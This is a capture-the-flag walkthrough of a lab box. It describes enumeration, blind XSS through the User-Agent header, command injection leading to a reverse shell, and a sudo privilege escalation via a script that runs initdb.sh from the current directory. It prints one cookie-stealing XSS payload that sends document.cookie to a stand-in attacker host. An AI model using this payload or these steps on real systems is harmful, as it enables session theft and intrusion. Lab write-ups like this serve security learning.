# PORT SCAN
* **22** &#8594; SSH
* **5000** &#8594; HTTP

<br><br><br>

# ENUMERATION & USER FLAG
The web port is really really simple

![cbb519fc9c39bc7ffb78f97f69e2986e.png](img/cbb519fc9c39bc7ffb78f97f69e2986e.png)

![0e3f9eef798ba3d925c1e0b852504dba.png](img/0e3f9eef798ba3d925c1e0b852504dba.png)

These thing seems pretty useless but with some enumeration I came across `/dashboard` that unlucky return a <u>401 error</u>.

![482c9f17ad505806e968ff984f28e572.png](img/482c9f17ad505806e968ff984f28e572.png)

Coll stuff, using burp to intercept the request we can see an interesting cookie is sent!

![fb86d8fb3e930e814e6b117b253c52c8.png](img/fb86d8fb3e930e814e6b117b253c52c8.png)

Strange cookie...using the Burp Decoder we can se the plaintext with base64 decode

![2b6a962ab7e3c48d93c84318d85c9156.png](img/2b6a962ab7e3c48d93c84318d85c9156.png)

Cool stuff, now I tried to send a simple **img tag** that point to my attacker http server to check if some XSS is possible but the creator of the box were pretty aware of this possibility....

![2912a7d295afff422dfd0901099ad353.png](img/2912a7d295afff422dfd0901099ad353.png)

My mind was tickling about poisoning one of the header records with the same malicious IMG tag, redo the detection with same payload and see the results. Luckly it worked

![ee7d4ef858f5b9aaf0b918fb9e637e76.png](img/ee7d4ef858f5b9aaf0b918fb9e637e76.png)

This is cool now the plan s simple, since this report would be seen by an administrator (and I assume would be seen inside the browser) we can try to inject inside the user agent an XSS payload like this `<img src='http://[ATTK_IP]/?c='+document.cookie>`. To intercept the request I use a simple PHP server (otherwise we would not be able to see the cookies), after I sent the poisoned request it took a few minutes before receive the request!

![7b1dc80d244175f92e1d090651789100.png](img/7b1dc80d244175f92e1d090651789100.png)

Now I can use this cookie to reach the `/dashboard`

![aeaf6e97fdb6dbe59f7137abfa952ddb.png](img/aeaf6e97fdb6dbe59f7137abfa952ddb.png)

I have played a little bit with the <u>health report</u> request and found a OS injection vulnerability

![a60a97f954bdaaa23833e805d0d5b119.png](img/a60a97f954bdaaa23833e805d0d5b119.png)

With this we are able to get a reverse shell and read the first flag

![b09f531d47207528574ab6deda71a3b7.png](img/b09f531d47207528574ab6deda71a3b7.png)

<br><br><br>

# PRIVILEGE ESCALATION

Even if we have control of a service user a special sudo permission on a costum bash script is allowed to be used

![b66766c03926984939822dc97fee291f.png](img/b66766c03926984939822dc97fee291f.png)

The bash script just check some basics system health value but a small section of the code is interesting because execute a SH script in the same directory the command is run called `initdb.sh`

![39d3dbbdfb7904d4270db07b5b982a29.png](img/39d3dbbdfb7904d4270db07b5b982a29.png)

Nothing more to say we have a way to execute OS command as root, I create a one-liner script that just spawn an interactive shell process that we can use it as root, after running back the costum script with SUDO we can read the flag!

![b2b7dd933913545171beb1719922fe0f.png](img/b2b7dd933913545171beb1719922fe0f.png)
